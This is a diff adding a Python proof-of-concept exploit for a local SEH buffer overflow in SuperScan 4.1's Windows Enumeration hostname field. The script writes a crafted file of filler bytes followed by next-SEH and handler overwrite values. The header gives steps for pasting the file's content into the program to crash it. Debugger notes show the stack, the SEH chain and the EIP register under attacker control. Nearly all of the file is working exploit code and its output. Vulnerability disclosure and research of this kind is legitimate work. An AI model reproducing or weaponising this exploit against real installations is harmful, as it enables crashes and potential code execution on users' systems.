@@ -1,0 +1,53 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# Exploit Title     : SuperScan 4.1 Windows Enumeration Hostname/IP/URL Field SEH Overflow Crash PoC
+# Discovery by      : Luis Martínez
+# Email		    : l4m5@hotmail.com
+# Discovery Date    : 18/11/2015
+# Vendor Homepage   : http://www.foundstone.com
+# Software Link     : http://www.mcafee.com/us/downloads/free-tools/superscan.aspx
+# Tested Version    : 4.1
+# Vulnerability Type    : Denial of Service (DoS) Local
+# Tested on OS      : Windows XP Professional SP3 x86 es
+# Steps to Produce the Crash: 
+# 1.- Run python code : python super_scan_4.1_windows_enumeration.py
+# 2.- Open super_scan_4.1_windows_enumeration.txt and copy content to clipboard
+# 3.- Open SuperScan4.1.exe
+# 4.- Paste Clipboard Windows Enumeration > Hostname/IP/URL
+# 5.- Clic on button -> Enumerate
+# 6.- Crashed
+##########################################################################################
+#  -----------------------------------NOTES----------------------------------------------#
+##########################################################################################
+# After the execution of POC, the SEH chain looks like this: 
+# 00E3FF98 43434343
+# 42424242 *** CORRUPT ENTRY ***
+  
+# And the Stack
+  
+#00E3FF88   41414141  AAAA
+#00E3FF8C   41414141  AAAA
+#00E3FF90   41414141  AAAA
+#00E3FF94   41414141  AAAA
+#00E3FF98   42424242  BBBB  Pointer to next SEH record
+#00E3FF9C   43434343  CCCC  SE handler
+
+# And the Registers
+  
+#EAX 00000001
+#ECX 00000001
+#EDX 7C91E514 ntdll.KiFastSystemCallRet
+#EBX 00A028E8
+#ESP 00E3FF58 ASCII "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC"
+#EBP 41414141
+#ESI 00473774 SuperSca.00473774
+#EDI 00000000
+#EIP 41414141
+
+buffer = "\x41" * 328
+nseh = "\x42" * 4
+seh = "\x43" * 4
+
+f = open ("super_scan_4.1_windows_enumeration.txt", "w")
+f.write(buffer + nseh + seh)
+f.close()
